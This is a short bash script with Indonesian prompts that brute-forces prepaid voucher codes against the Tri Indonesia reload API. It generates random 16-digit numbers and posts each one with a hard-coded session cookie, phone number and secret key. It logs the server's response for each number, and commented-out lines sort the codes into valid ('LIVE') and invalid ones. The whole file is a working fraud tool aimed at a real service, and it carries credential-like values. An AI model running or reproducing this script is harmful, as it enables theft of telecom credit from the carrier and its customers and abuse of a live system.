NC='\033[0m'
GREEN='\e[38;5;82m'
RED='\e[38;5;196m'
echo -n "Jumlah Generate : "
read jumlah
for i in $(cat /dev/urandom | tr -dc '0-9' | fold -w 16 | head -n $jumlah); do
	login=$(curl -s -X POST --url "http://my.tri.co.id/api/profile/reload" -H "Accept: application/json, text/plain, */*" -H "Accept-Language: en-US,en;q=0.9" -H "Connection: keep-alive" -H "Content-Length: 260" -H "Content-Type: application/json" -H "Cookie: _ga=GA1.3.1539933578.1524322627; _gid=GA1.3.1634832782.1525459506; BIGipServerSelfcare_Web_80=2417508362.20480.0000; TS0136d4fa=016eb28ea495aa37f28ff8544418d9bc83aa51ec64fd6dd653c13cd479b4cb7d1d8f96327ca7e7cc0a1e464243572c3e8b4b8481758ea5fb219f413e390f06926d7517143a" -H "Host: my.tri.co.id" -H "Origin: http://my.tri.co.id" -H "Referer: http://my.tri.co.id/reload" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36" -d '{"callPlan":"SP JANET SERIBU","deviceManufacture":"","deviceModel":"","deviceOs":"","imei":"WebSelfcare","language":"0","msisdn":"62895340454593","secretKey":"6e5brZat17V+lQueLMvZ2Q==hwqrBM1guDtlsOUqPt1zWSbz5O0npsTahSSBmTfo","voucherNumber":"'$i'"}' | grep -Po "(?<=\"message\":\").*?(?=\",)")
	printf "${GREEN}$login  => ${i}${NC}\n"
	echo "$login => $i" >> "$login.txt"
	#if [[ "$login" = "Kode Voucher Salah" ]]; then
	#	printf "[$x]${RED}[DIE]\t=> $i\n"
	#else
	#	printf "[$x]${GREEN}[LIVE]\t=> ${i}${NC}\n"
	#	echo "$generate " >> livetri.txt
	#fi
done
